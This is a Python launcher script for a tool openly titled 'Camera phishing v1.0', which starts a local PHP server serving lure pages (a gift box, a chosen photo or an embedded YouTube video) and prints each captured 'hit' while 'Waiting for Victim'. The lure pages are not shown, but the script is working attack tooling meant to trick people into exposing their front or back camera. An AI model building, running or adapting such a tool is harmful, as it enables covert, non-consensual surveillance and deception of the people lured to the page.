import os, subprocess, time, shutil

def banner():
    os.system('clear')
    print("\033[1;32m  ____  _   _ ____         ____                      _     _     _ ")
    print(" / ___|| | | |  _ \       / ___|__ _ _ __ ___  _ __ | |__ (_)___| |")
    print(" \___ \| |_| | |_) |_____| |   / _` | '_ ` _ \| '_ \| '_ \| / __| |")
    print("  ___) |  _  |  _ <______| |__| (_| | | | | | | |_) | | | | \__ \_|")
    print(" |____/|_| |_|_| \_\      \____\__,_|_| |_| |_| .__/|_| |_|_|___(_)")
    print("                                              |_|                  \033[0m")
    print("\033[1;37m  [ Tool: Camera phishing v1.0 ]  \033[1;33m{ Created by Roshan Shah }\033[0m")
    print("\033[1;31m  [Team: CYBER SHR]\033[0m")
    print("-" * 65)

def start():
    if not os.path.exists("sites/camera"): os.makedirs("sites/camera")
    banner()
    print("\n[01] Front Camera (High Quality)")
    print("[02] Back Camera (High Quality)")
    print("[03] Dual Camera (Front + Back)")
    
    choice = input("\n\033[1;36m[+] Select Option: \033[0m")
    mode = "front"
    if choice == '2': mode = "back"
    elif choice == '3': mode = "dual"

    print("\n\033[1;33m[!] Choose Link Type:\033[0m")
    print("[01] Direct Link (Gift Box Page)")
    print("[02] Custom Photo Link (Show your Image)")
    print("[03] YouTube Video Link (Play Video)")
    link_type = input("\n\033[1;36m[+] Select: \033[0m")

    if link_type == '2':
        img_path = input("\n\033[1;32m[+] Enter Photo Path: \033[0m")
        if os.path.exists(img_path):
            shutil.copy(img_path, "sites/camera/custom.jpg")
            with open("sites/camera/type.txt", "w") as f: f.write("custom")
        else:
            print("\033[1;31m[-] File not found! Using Direct Link.\033[0m")
            with open("sites/camera/type.txt", "w") as f: f.write("direct")
    elif link_type == '3':
        yt_link = input("\n\033[1;32m[+] Enter YouTube Video Link: \033[0m")
        # YouTube link ko embed format mein convert karna (agar normal link ho to)
        if "watch?v=" in yt_link:
            yt_link = yt_link.replace("watch?v=", "embed/")
        with open("sites/camera/yt_link.txt", "w") as f: f.write(yt_link)
        with open("sites/camera/type.txt", "w") as f: f.write("youtube")
    else:
        with open("sites/camera/type.txt", "w") as f: f.write("direct")

    with open("sites/camera/mode.txt", "w") as f: f.write(mode)
    if os.path.exists("sites/camera/logs.txt"): os.remove("sites/camera/logs.txt")

    print(f"\n\033[1;32m[*] Server active on Port 8080 | Mode: {mode.upper()}\033[0m")
    subprocess.Popen("php -S 127.0.0.1:8080 -t sites/camera/", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    print("\033[1;33m[!] Waiting for Victim... (Ctrl+C to stop)\n\033[0m")
    print("-" * 65)

    last_line = 0
    while True:
        if os.path.exists("sites/camera/logs.txt"):
            with open("sites/camera/logs.txt", "r") as f:
                lines = f.readlines()
                if len(lines) > last_line:
                    for i in range(last_line, len(lines)):
                        print(f"\033[1;32m[+] NEW SUCCESSFUL HIT!\033[0m")
                        print(f"\033[1;37m{lines[i].strip()}\033[0m")
                        print("-" * 65)
                    last_line = len(lines)
        time.sleep(1)

if __name__ == "__main__":
    start()
    
